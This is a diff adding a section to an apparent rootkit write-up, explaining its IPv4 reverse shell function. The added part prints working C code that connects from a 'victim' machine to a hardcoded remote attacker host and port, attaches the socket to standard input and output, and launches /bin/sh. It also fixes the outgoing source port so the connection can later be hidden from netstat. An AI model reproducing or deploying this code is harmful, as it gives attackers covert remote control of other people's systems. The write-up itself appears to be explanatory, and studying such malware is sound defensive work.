@@ -274,6 +274,47 @@ If `strcmp()` returns a value other than `0`, indicating there was not a match b
 The `ipv6_rev()` function works very similarly except it has been programmed to deal strictly with IPv6 traffic. 
 
 ### `ipv4_rev()` Reverse Shell
+Below is the code block defining our IPv4 reverse shell function:
+```c
+int ipv4_rev (void)
+{
+    const char* host = REM_HOST4;
+
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(REM_PORT);
+    inet_aton(host, &addr.sin_addr);
+
+    struct sockaddr_in client;
+    client.sin_family = AF_INET;
+    client.sin_port = htons(LOC_PORT);
+    client.sin_addr.s_addr = INADDR_ANY;
+
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    bind(sockfd, (struct sockaddr*) &client, sizeof(client));
+
+    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));
+
+    for (int count = 0; count < 3; count++)
+    {
+        dup2(sockfd, count);
+    }
+
+    execve("/bin/sh", NULL, NULL);
+    close(sockfd);
+
+    return 0;
+}
+```
+
+The `ipv4_rev()` function works very similarly to the bind shell we just explained; however, the remote host address and port have been hardcoded and defined by the `REM_HOST4` and `REM_PORT` definitions respectively. 
+
+One other aspect of the reverse shell, is that we issue a `bind()` syscall with the following line: `bind(sockfd, (struct sockaddr*) &client, sizeof(client));`. `client` in this case is a reference to our `client` struct of type `sockaddr` which describes the victim host (the client in a reverse shell paradigm). This line of code helps us ensure that the outgoing reverse shell connection is coming from a specific source port (`LOC_PORT` or `65065`) on the victim which will come in handy later when we are hiding connections from `/bin/netstat` based on a port number. 
+
+
+
+
 
 
  
